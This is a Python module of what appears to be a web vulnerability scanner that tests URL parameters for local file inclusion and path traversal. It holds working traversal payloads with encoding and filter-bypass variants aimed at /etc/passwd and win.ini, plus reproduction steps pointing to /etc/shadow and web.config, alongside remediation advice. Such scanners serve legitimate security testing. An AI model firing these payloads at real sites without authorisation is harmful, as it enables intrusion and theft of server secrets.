import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from scanner.core import Finding, Severity, ScanSession, build_curl
from scanner.log import logger

LFI_PAYLOADS = [
    ("../../../etc/passwd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("....//....//....//etc/passwd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("..%2f..%2f..%2fetc%2fpasswd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("..%252f..%252f..%252fetc%252fpasswd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("....\\....\\....\\windows\\win.ini", r"^\[fonts\]", "Windows", "C:\\windows\\win.ini"),
    ("../../../windows/win.ini", r"^\[fonts\]", "Windows", "C:\\windows\\win.ini"),
    ("/etc/passwd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
    ("file:///etc/passwd", r"root:[x*]:0:0:", "Linux", "/etc/passwd"),
]

PATH_TRAVERSAL_PARAMS = [
    "file", "path", "page", "template", "include", "doc", "document",
    "folder", "root", "pg", "style", "pdf", "img", "filename",
    "preview", "load", "read", "content", "download", "view",
]


def _get_traversal_technique(payload):
    if "%252f" in payload:
        return "double URL encoding"
    if "%2f" in payload:
        return "URL encoding"
    if "..../" in payload or "...//" in payload:
        return "filter bypass with nested traversal sequences"
    if "..\\" in payload:
        return "backslash traversal"
    if payload.startswith("file:"):
        return "file:// URI scheme"
    return "absolute path" if payload.startswith("/") else "relative path traversal"


def run(session: ScanSession) -> None:
    logger.info("\n[*] Testing for Local File Inclusion / Path Traversal...")

    for url in session.crawled_urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            continue

        for param, values in params.items():
            if param.lower() not in PATH_TRAVERSAL_PARAMS:
                original = values[0] if values else ""
                if not any(c in original for c in "./\\"):
                    continue
            _test_param(session, url, param, values[0] if values else "")

    # Probe common param names on the target root
    base_url = session.config.target.rstrip("/")
    for param in PATH_TRAVERSAL_PARAMS[:5]:
        test_url = "{}?{}=test".format(base_url, param)
        resp = session.get(test_url)
        if resp and resp.status_code == 200:
            _test_param(session, test_url, param, "test")


def _test_param(session, url, param, original):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    params[param] = [original or "harmless_value"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    baseline_resp = session.get(baseline_url)
    baseline_text = baseline_resp.text if baseline_resp else ""

    for payload, indicator, target_os, target_file in LFI_PAYLOADS:
        params[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
        resp = session.get(test_url)
        if not resp or resp.status_code in (404, 403):
            continue

        match = re.search(indicator, resp.text, re.IGNORECASE | re.MULTILINE)
        if not match or re.search(indicator, baseline_text, re.IGNORECASE | re.MULTILINE):
            continue

        matched_text = match.group(0)
        if not (_looks_like_passwd(resp.text, indicator) or _looks_like_winini(resp.text, indicator)):
            continue

        technique = _get_traversal_technique(payload)
        idx = resp.text.find(matched_text)
        snippet = resp.text[max(0, idx - 60):min(len(resp.text), idx + len(matched_text) + 60)].replace('\n', ' ').strip()

        session.add_finding(Finding(
            title="Local File Inclusion / Path Traversal",
            severity=Severity.CRITICAL,
            description=(
                "The URL parameter '{param}' is vulnerable to Local File Inclusion (LFI) "
                "via {technique}. The application uses user-supplied input to construct "
                "file paths without proper validation, allowing an attacker to read "
                "arbitrary files from the server's filesystem. The attack successfully "
                "retrieved the contents of '{tfile}' on the {tos} server. "
                "This can lead to disclosure of sensitive configuration files, source code, "
                "credentials, and in some cases Remote Code Execution through log poisoning "
                "or PHP filter chains."
            ).format(param=param, technique=technique, tfile=target_file, tos=target_os),
            evidence=(
                "Parameter: {param}\nTarget OS: {tos}\nFile Retrieved: {tfile}\n"
                "Traversal Technique: {technique}\nPayload Sent: {pay}\n"
                "Pattern Matched: {matched}\nResponse Snippet: ...{snip}...\n"
                "Response Status: {status}\n"
                "Baseline Contained Pattern: No (confirmed not a false positive)"
            ).format(param=param, tos=target_os, tfile=target_file, technique=technique,
                     pay=payload, matched=matched_text, snip=snippet, status=resp.status_code),
            remediation=(
                "1. Never use user input directly in file path construction.\n"
                "2. Implement a whitelist of allowed file names or identifiers that map to server-side paths.\n"
                "3. Use os.path.realpath() or equivalent to resolve paths and verify they stay within the intended directory.\n"
                "4. Strip or reject path traversal characters (../, ..\\, %2f, %252f, null bytes).\n"
                "5. Run the application with minimal filesystem permissions.\n"
                "6. Consider using chroot or containerization to limit filesystem access."
            ),
            url=url,
            module="lfi",
            cwe="CWE-98",
            confirmed=True,
            location="URL parameter '{}' in query string".format(param),
            parameter=param,
            payload=payload,
            request_method="GET",
            response_status=resp.status_code,
            curl_command=build_curl("GET", test_url),
            reproduction_steps=(
                "1. Open the target URL: {url}\n"
                "2. Modify the '{param}' parameter value to: {pay}\n"
                "3. Send the GET request (full URL: {turl})\n"
                "4. Observe the contents of '{tfile}' in the response body.\n"
                "5. The matched pattern '{matched}' confirms successful file read.\n"
                "6. To test further impact, try reading sensitive files:\n"
                "   - Linux: /etc/shadow, /proc/self/environ, application config files\n"
                "   - Windows: C:\\inetpub\\wwwroot\\web.config, boot.ini"
            ).format(url=url, param=param, pay=payload, turl=test_url,
                     tfile=target_file, matched=matched_text),
            developer_fix=(
                "File: The server-side code that handles the '{path}' route and uses "
                "the '{param}' parameter to load or include files.\n"
                "\n"
                "Fix: Replace direct path concatenation with a whitelist approach.\n"
                "Instead of:\n"
                "  filepath = os.path.join(base_dir, request.args['{param}'])\n"
                "  return open(filepath).read()\n"
                "Use:\n"
                "  ALLOWED_FILES = {{'page1': 'templates/page1.html', 'page2': 'templates/page2.html'}}\n"
                "  page_key = request.args.get('{param}', '')\n"
                "  if page_key not in ALLOWED_FILES:\n"
                "      abort(404)\n"
                "  filepath = ALLOWED_FILES[page_key]\n"
                "\n"
                "If dynamic paths are necessary, validate the resolved path:\n"
                "  import os\n"
                "  base = os.path.realpath('/var/www/allowed_dir')\n"
                "  target = os.path.realpath(os.path.join(base, user_input))\n"
                "  if not target.startswith(base + os.sep):\n"
                "      abort(403)  # Path traversal attempt\n"
                "  return send_file(target)"
            ).format(path=parsed.path, param=param),
            affected_component="Route handler for {} - file inclusion logic".format(parsed.path),
            references=(
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
                " | https://cwe.mitre.org/data/definitions/98.html"
                " | https://owasp.org/www-community/attacks/Path_Traversal"
            ),
            detection_method="Injected directory traversal sequences (../, ....// , %2e%2e/) targeting /etc/passwd and win.ini into URL parameters. Validated by checking for structural markers (3+ colon-delimited lines for passwd) rather than simple regex, with baseline comparison.",
        ))
        return


def _looks_like_passwd(text, indicator):
    if "root:" not in indicator:
        return True
    lines = [l for l in text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
    return len(lines) >= 3


def _looks_like_winini(text, indicator):
    if "fonts" not in indicator:
        return True
    return "[fonts]" in text.lower() and "[extensions]" in text.lower()
